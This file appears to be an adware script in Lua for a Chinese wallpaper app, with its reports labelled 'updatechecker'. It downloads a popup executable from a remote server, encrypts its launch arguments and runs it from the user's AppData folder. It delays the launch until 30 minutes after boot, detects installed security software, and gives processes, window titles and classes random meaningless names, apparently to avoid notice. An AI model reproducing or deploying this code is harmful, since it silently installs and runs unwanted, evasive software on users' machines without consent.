require ("unicorn")
require ("extra")

--[[
]]
project = "jcbz"

function report_kunbang(name,p1,p2,p3,p4,p5,p6,p7)
	extra.report_kunbang(project,name,p1,p2,p3,p4,p5,p6,p7)
end

function taskid_last_time(value)
	return extra.taskid_last_time(project,value)
end

function save_taskid(value)
	extra.save_taskid(project,value)
end

function qid()
	return extra.qid(project)
end

function uid()
	return extra.uid(project)
end

function version()
	return extra.version(project)
end

function md5()
	return extra.md5(project)
end

function city_name()
	return extra.city_name(project)
end

function enable_news()
	return extra.enable_news(project)
end

function first_install_time()
	return extra.first_install_time(project)
end

function nopop_set_time(value)
	return extra.nopop_set_time(project,value)
end

function invoke_exe(url, md5, localpath, args, reportprefix)
	return extra.invoke_exe(project, url, md5, localpath, args, reportprefix)
end

function invoke_exe_inject(url, md5, localpath, gif_url, gif_md5, gif_name, args, reportprefix)
	return extra.invoke_exe_inject(project, url, md5, localpath, gif_url, gif_md5, gif_name, args, reportprefix)
end

function invoke_dll(url,md5,localpath,args)
	return extra.invoke_dll(project,url,md5,localpath,args)
end

function install_date()
	return extra.install_date(project)
end

function printf(value)
	unicorn.printf(value .. "\n")
end

--安装间隔天数/近期不弹/最小间隔天数判断，返回结果结果为天数直接判断大小
function interval(timestamp, difftype)
	timestamp = tonumber(timestamp)
	if timestamp == nil then
		timestamp = 0
	end
	local today =
		os.time({year = os.date("%Y", os.time()), month = os.date("%m", os.time()), day = os.date("%d", os.time())})
	local otherday =
		os.time({year = os.date("%Y", timestamp), month = os.date("%m", timestamp), day = os.date("%d", timestamp)})
	local day = math.floor(os.difftime(today, otherday) / 86400)
	local hour = math.floor(os.difftime(os.time(), timestamp) / 3600)
	if difftype == nil then
		return math.abs(day)
	elseif string.lower(difftype) == "d" then
		return math.abs(day)
	elseif string.lower(difftype) == "h" then
		return math.abs(hour)
	else
		return math.abs(day)
	end
end

function report_onday(value,from)
	if interval(taskid_last_time(value)) < 1 then
		return
	else
		report_kunbang(value,true,true,true,true,0,from,true)
		save_taskid(value)
		return
	end
end

--匹配数组内元素,value=搜索词,array=被搜索数组,searchtype不填写或写0为前置匹配,其他为全词匹配
function stringinarray(value,array,searchtype)
	if searchtype == nil or searchtype == 0 then
		-- 前置匹配
		for k, v in ipairs(array) do
			local pos = string.find( string.upper(value), string.upper(v))
			if (pos == 1) then
				return true
			end
		end
		return false
	else
		--全词匹配
		for k, v in ipairs(array) do
			if (string.upper(v) == string.upper(value)) then
			return true
			end
		end
		return false
	end
end

--json数据转换
function table_maxn(t)
    local mn = 1;
    for k, v in pairs(t) do
      if(type(k) ~= "number") then
        mn = 0;
      end
    end
    return mn;
end

function table2json(t)  
    local function serialize(tbl)  
            local tmp = {}  
            for k, v in pairs(tbl) do  
                    local k_type = type(k)
                    local v_type = type(v)
                    local key = (k_type == "string" and "\"" .. k .. "\":")  
                        or (k_type == "number" and "")  
                    local value = (v_type == "table" and serialize(v))  
                        or (v_type == "boolean" and tostring(v))  
                        or (v_type == "string" and "\"" .. v .. "\"")  
                        or (v_type == "number" and v)  
                    tmp[#tmp + 1] = key and value and tostring(key) .. tostring(value) or nil  
            end  
            if table_maxn(tbl) == 0 then  
                    return "{" .. table.concat(tmp, ",") .. "}"  
            else  
                    return "[" .. table.concat(tmp, ",") .. "]"  
            end  
    end  
    assert(type(t) == "table")  
    return serialize(t)  
end

function string.split(input, delimiter)
	input = tostring(input)
	delimiter = tostring(delimiter)
	if (delimiter == "") then
		return false
	end
	local pos, arr = 0, {}
	-- for each divider found
	for st, sp in function()
		return string.find(input, delimiter, pos, true)
	end do
		table.insert(arr, string.sub(input, pos, st - 1))
		pos = sp + 1
	end
	table.insert(arr, string.sub(input, pos))
	return arr
end

--随机函数
function random(start,ends)
	math.randomseed(tostring(os.time()):reverse():sub(1,6))
	return math.random(start,ends)
end

--随机函数
function random(start, ends, exclude)
	local result = {}
	local flag = false
	for i = start, ends do
		flag = false
		if exclude ~= nil then
			for k, v in pairs(exclude) do
				if i == v then
					flag = true
					break
				end
			end
		end
		if flag == false then
			table.insert(result, i)
		end
	end
	math.randomseed(math.abs(os.clock()) * math.random(1000000, 90000000) + math.random(1000000, 90000000))
	local a = math.random(1, #result)
	return result[a]
end

--检查不弹环境,输入上报前缀及不弹列表
function check_enviroment(reportprefix,exclude_list)
	-- 检查渠道号
	if stringinarray(qid(),exclude_list.qid) then
		report_onday(reportprefix .. ".nopop-qid",3)
		printf(reportprefix .. ".nopop-qid")
		return false
	end
	-- 检查版本号
	if stringinarray(version(),exclude_list.version) then
		report_onday(reportprefix .. ".nopop-version",3)
		printf(reportprefix .. ".nopop-version")
		return false
	end
	-- 检查md5
	if stringinarray(md5(),exclude_list.md5,1) then
		report_onday(reportprefix .. ".nopop-md5",3)
		printf(reportprefix .. ".nopop-md5")
		return false
	end
	-- 检查城市
	if stringinarray(city_name(),exclude_list.citys,1) then
		report_onday(reportprefix .. ".nopop-city",3)
		printf(reportprefix .. ".nopop-city")
		return false
	end
	-- 检查进程名
	for k,v in ipairs(exclude_list.process)
	do 
		if stringinarray(v,unicorn.process,1)
		then
			report_onday(reportprefix .. ".nopop-process",3)
			printf(reportprefix .. ".nopop-process")
			return false
		end
	end
	--全屏不弹
	if unicorn.full_screen() == true then
		printf(reportprefix .. ".nopop-fullscreen")
		return false
	end
	return true
end


--计算弹出次数
function showcount(taskidlist, taskid)
    local x = 1
    for k, v in pairs(taskidlist) do
        if v == taskid then
            return x
        else
            if interval(taskid_last_time(v)) < 1 then
                x = x + 1
            end
        end
    end
    return x
end

function showcount2(taskidlist, taskid, reg_taskidlist, nowdate)
	local x = 1
	for k, v in pairs(taskidlist) do
		if v == taskid then
			return x
		else
			if reg_taskidlist[k] == nowdate then
				x = x + 1
			end
		end
	end
	return x
end

--删除table里面的value
function table.removeTableData(array,value)
	if array ~= nil and next(array) ~= nil then
		for i=#array,1,-1 do
    		if array[i] == value then
        		table.remove(array, i)
   	 		end
		end
	end
end

--IE版本判断
function ie_vision()
	local ie_v = unicorn.reg_read_string("HKLM", "SOFTWARE\\Microsoft\\Internet Explorer", "svcVersion")
	if ie_v ~= "" then
		return tonumber(string.sub(ie_v, 1, string.find(ie_v, "%.") - 1))
	else
		ie_v = unicorn.reg_read_string("HKLM", "SOFTWARE\\Microsoft\\Internet Explorer", "Version")
		return tonumber(string.sub(ie_v, 1, string.find(ie_v, "%.") - 1))
	end
end

--互斥判断1，谁先安装谁先弹pop_checker(projectlist, "tips", reportprefix) == true
function pop_checker(projectlist, poptype, reportprefix)
	local result = false
	local fresult = false
	local url = ""
	local switch = {
		kuaizip = function()
			url = "http://i.kpzip.com/n/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "kuaizip", poptype, url, "kuaizipuc2")
		end,
		heinote = function()
			url = "http://down1.7654.com/n/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "heinote", poptype, url, "heinoteuc2")
		end,
		kantu = function()
			url = "http://down2.abckantu.com/logo/v1.0.0.3/uc2.gif"
			result = extra.popup_checker(project, "kantu", poptype, url, "kantuuc2")
		end,
		xiaoyu = function()
			url = "http://down1.xiaoyu.shzhanmeng.com/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "xiaoyu", poptype, url, "xiaoyuuc2")
		end,
		finder = function()
			url = "http://ifinder.shzhanmeng.com/logo/v1.0.0.1/uc2.gif"
			result = extra.popup_checker(project, "finder", poptype, url, "finderuc2")
		end,
		browser = function()
			url = "http://down1.7654browser.shzhanmeng.com/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "browser", poptype, url, "browseruc2")
		end
	}
	for k, v in pairs(projectlist) do
		local fSwitch = switch[string.lower(v)]
		if fSwitch then
			fSwitch()
		end
		if result == true then
			report_kunbang(reportprefix .. ".banpopup_" .. v, true, true, true, true, 0, 3, true)
			fresult = result
			return fresult
		end
	end
	return fresult
end

function report_common(reportprefix, module, value, p1)
    extra.report_common(project, reportprefix, module, value, p1)
end

function report_common_oneday(reportprefix, module, value, p1)
    if interval(taskid_last_time(reportprefix .. value)) < 1 then
        return
    else
        report_common(reportprefix, module, value, p1)
        save_taskid(reportprefix .. value)
        return
    end
end

--进程名标题名、类名随机产生
function random_name(pop_type, result_type)
	if result_type == nil then
		result_type = "name"
	end
	local mini = {
		name = {"zmyyigxj","mreinipg","gtymiqw","ytfbiert","rrfdmtyu","tryubcmt","iuhffmn","sdelknmre","rtfsdfni","xtrgbnti"},
		title = {"trfmtxx","rfgbmexx","uyhfibz","nhyumra","ourmib","cfyimgc","oifcmid","recmie","grxamif","rdzmig"},
		class = {"edxuehfxx","esmudhxx","ertmkfjbz","uibffva","itfiedsb","ewsfadc","xxdqaad","xxmdeswe","xxmefkff","xxmjfjxg"}
	}
	local tpop = {
		name = {"fkctyuxx","ufztwerxx","sfctbghxx","ojvtpkilxx","sdgthytx","hajdtvcdx","mdhteryxx","5ttnbvxx","iftscxvx","dfhtmnbxx"},
		title = {"thgftpre","dfetfsaa","etyurrkb","ytfdwpc","ewrwtpopd","yyftpope","yuuttpf","vxbhspg","xbtprth","podbfopw"},
		class = {"xfgyrcs","rruudjei","yjhgiriw","efbztyrr","rgjurypd","ifjdjape","ahuekqpf","uwqyopg","xbztpuph","werrgpw"}
	}
	local tips = {
		name = {"retetsdx","bfewwdad","gregdffy","sgrwwazc","sgrsxzdgx","rgreadgg","sregrfdfx","sgrgcvsz","rthdffvx","jsyurygzk"},
		title = {"fdgrxbgn","dfhrddss","ohdhwds","dfnhjyju","fwefqfdg","jtdfaddg","fdhthrjad","rgergdhj","hjrfghfhi","dgreedsj"},
		class = {"htrhrfsq","fjuuiljw","pokwksar","iepwdfsy","rerterfu","dfhdrdso","htjymkfsp",",kjiddfz","dhrtjuyux","adffggrm"}
	}
	local tnews = {
		name = {"dhtyhrrfx","xfghrtrtg","jsfhhgela","yjtyrfgh","dfgerthhs","rhgtrhcf","ghegerds","uikytsda","wfreterh","dfhyjukh"},
		title = {"ghrthdas","gregerhha","htyjtujsb","hfthrthh","dgdhghhsd","sfhlilsj","jfjyyjkse","dgwrgwsf","iahduwg","ewfwefsh"},
		class = {"yjyulius","tyukukhja","kiufghssb","kiurfssc","ghersgfhg","fdjkukde","shghstryf","wrahhtsg","bhjrywsh","oippdvsj"}
	}
	local result, sed
	if pop_type == "mini" then
		sed = random(1, #mini[result_type])
		result = mini[result_type][sed]
	elseif pop_type == "tpop" then
		sed = random(1, #tpop[result_type])
		result = tpop[result_type][sed]
	elseif pop_type == "tips" then
		sed = random(1, #tips[result_type])
		result = tips[result_type][sed]
	elseif pop_type == "tnews" then
		sed = random(1, #tnews[result_type])
		result = tnews[result_type][sed]
	end
	return result
end

function env_get()
	local env = ""
	for key, value in pairs({is360, isqq, isjs}) do
		if value == true then
			env = env .. key
		end
	end
	if env == "" then
		env = 0
	end
	return env
end

function adinfo(url)
	local result
	url = "http://ads.7654.com/prod/" .. string.gsub(string.match(url, "http://(.*)"), "/", ".") .. ".json"
	local json = unicorn.web_http_get(url)
	result = string.match(json, "{(.*)}")
	if result == nil then
		return ""
	else
		result = string.gsub(result, '"', "")
		result = string.gsub(result, ":", "=")
		result = string.gsub(result, ",", "&")
		return "?" .. result
	end
end

function json_api(json)
	local exe_version, exe_file, exe_md5, dll_version, dll_file, dll_md5, position, mutex, link
	local antivirus, antivirus_size, antivirus_node, qid, qid_node, city_node, city
	local function json_result(jsonnode)
		local json_exe, json_dll, times, popup_time_link, popup_size, popup_timing, popup_position, popup_mutex
		--获取exe
		json_exe = extra.json_node(jsonnode, "exe")
		exe_version = extra.json_str(json_exe, "version")
		local file_result = {}
		local file_node = extra.json_node(json_exe, "files")
		local file_size = extra.json_size(file_node)
		for i = 0, file_size - 1, 1 do
			local item = extra.json_node_item(file_node, i)
			table.insert(file_result, extra.json_str(item, ""))
		end
		local md5_result = {}
		local md5_node = extra.json_node(json_exe, "md5")
		local md5_size = extra.json_size(md5_node)
		for i = 0, md5_size - 1, 1 do
			local item = extra.json_node_item(md5_node, i)
			table.insert(md5_result, extra.json_str(item, ""))
		end
		exe_file = file_result
		exe_md5 = md5_result
		--获取dll
		json_dll = extra.json_node(jsonnode, "dll")
		dll_version = extra.json_str(json_dll, "version")
		dll_file = extra.json_str(json_dll, "file")
		dll_md5 = extra.json_str(json_dll, "md5")
		--获取弹出位置
		popup_position = extra.json_node(jsonnode, "popup_position")
		position = extra.json_str(popup_position, "popup_position")
		--获取互斥变量
		popup_mutex = extra.json_node(jsonnode, "mutex")
		mutex = extra.json_str(popup_mutex, "mutex")
		--获取弹出链接
		popup_time_link = extra.json_node(jsonnode, "popup_time_link")
		popup_timing = extra.json_node(popup_time_link, "popup_timing")
		popup_size = extra.json_size(popup_timing)
		for i = 0, popup_size - 1, 1 do
			local item = extra.json_node_item(popup_timing, i)
			times = extra.json_str(item, "times")
			item2 = string.split(times, "-")
			if nowtime >= item2[1] and nowtime <= item2[2] then
				link = extra.json_str(item, "link")
				break
			end
		end
	end
	--生成默认配置
	local json_root = extra.json_parsing(json)
	if json_root == -1 then
		return false
	end
	local json_common = extra.json_node(json_root, "common")
	if json_common ~= -1 then
		json_result(json_common)
	end
	--特殊配置检查
	local json_additions = extra.json_node(json_root, "additions")
	if json_additions ~= -1 then
		local env = (is360 and "1" or "0") .. (isqq and "1" or "0") .. (isjs and "1" or "0")
		local additions_size = extra.json_size(json_additions)
		for x = 0, additions_size - 1, 1 do
			local flag1 = false
			local flag2 = false
			local flag3 = false
			local addition = extra.json_node_item(json_additions, x)
			--获取环境判断
			antivirus_node = extra.json_node(addition, "antivirus")
			antivirus = extra.json_node(antivirus_node, "antivirus")
			antivirus_size = extra.json_size(antivirus)
			for i = 0, antivirus_size - 1, 1 do
				local item = extra.json_node_item(antivirus, i)
				item = extra.json_str(item, "")
				if env == item or item == "全环境" then
					flag1 = true
					break
				end
			end
			--获取渠道判断
			qid_node = extra.json_node(addition, "channel")
			qid = extra.json_str(qid_node, "channel")
			qid = string.split(qid, ";")
			table.remove(qid, #qid)
			if stringinarray(p_qid, qid) == true or qid[1] == nil then
				flag2 = true
			end
			--获取城市判断
			city_node = extra.json_node(addition, "city")
			city = extra.json_str(city_node, "city")
			city = string.split(city, ";")
			table.remove(city, #city)
			if stringinarray(p_city, city) == false or city[1] == nil then
				flag3 = true
			end

			if flag1 == true and flag2 == true and flag3 == true then
				json_result(addition)
				break
			end
		end
	end
	extra.json_clean()
	local sed = random(1, #exe_file)
	local result = {
		exe = {exe_version .. "/" .. exe_file[sed], exe_md5},
		dll = {dll_version .. "/" .. dll_file, dll_md5},
		pos = position,
		mutex = mutex,
		url = link
	}
	return result
end

function execute_tpop()
	report_kunbang("tpop.run-task",true,true,true,true,0,4,true)
	local path = "http://down1.wallpaper.muxin.fun/tui/tpop/v3.1.2.0/tpop-"
	local md5 = {
		"E0CFA3C2EA2D2105B9E54A3D34A8116D"
	}
	local sed = random(1,#md5)
	local args = {
		"-project=JCWallpaper",
		"-wait=0",
		"-enabletitlenews=1",
		"-enablehomepagerand=1",
		"-signcitys=",
		"-classname=jcbztpop",
		"-title=jcbztpop",
		"-o=50",
		"-killprocess=60"
	}

	--开机30分钟后弹
	if (math.abs(tonumber(unicorn.boot_time)) / 60000) < 30 then
		return
	end

	local localpath = "%APPDATA%\\jcbz\\jingcai"
	local localname = "jctpopxx"

	local tpoptaskid = ((nowtime >= "00:00" and nowtime < "23:59") and "ttpop1") or  nil
	if nowtime >= "00:00" and nowtime < "23:59" and interval(taskid_last_time(tpoptaskid)) >= 1 then
		table.insert(args,"-dspurl=http://beta-tpop4.7654.com/newTpop/infoflow/jc/1/")
		--printf("其他环境tpop全天运行")
	else
		return
	end

	local taskidlist = {
        "ttpop1",
		"ttpop2",
		"ttpop3"
	}

	local reportprefix = "tpop2"
	if is360 == true then
		localpath = "%APPDATA%\\jcbz\\jingcai"
		localname = "jctpopxx"
		reportprefix = "tpop1-".. showcount(taskidlist,tpoptaskid)
	else
		reportprefix = "tpop2-".. showcount(taskidlist,tpoptaskid)
	end

	if interval(taskid_last_time(tpoptaskid)) < 1 then --6到12点一次
		return
	end
	table.insert(args, "-reportprefix=" .. reportprefix)
	local exclude_list = {
		qid = {"gw_001","txgj_001","lxbz_001"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tpop4.gif";
	local gif_md5 = "D1308CFBF5C94CA4577E5675EC73172E";
	local gif_name = "logotpop";

	table.insert(args,"-taskid=taskid." .. tpoptaskid)
	report_kunbang("updatechecker." .. reportprefix,true,true,true,true,0,4,true)
	args = extra.encrypte(table.concat(args, " "))
	--print(table.concat(args, " "))
	return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tpop.")
	--return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tpop.")
end

function main()
	report_kunbang("updatechecker.run-task",true,true,true,true,0,4,true)
	execute_tpop()
end

--全局变量定义
nowtime=os.date("%H:%M")
nowtime1 = os.date("%Y-%m-%d")
day = os.date("%d")
wekd = os.date("%w")                        --[0 - 6 = 星期天 - 星期六]
p_version = version()
p_qid = qid()
p_uid = uid()
p_city = city_name()
p_first_install_time = first_install_time()
is360 = extra.safe_soft.safe360
isqq = extra.safe_soft.qqpc
isjs = extra.safe_soft.jinshan

--kuaiguo渠道新用户7天后弹出
if interval(p_first_install_time) < 7 and stringinarray(p_qid, {"kuaiguo_"}) == true then
	report_onday("pop.banpop-kuaiguo", 4)
	return
end

main()
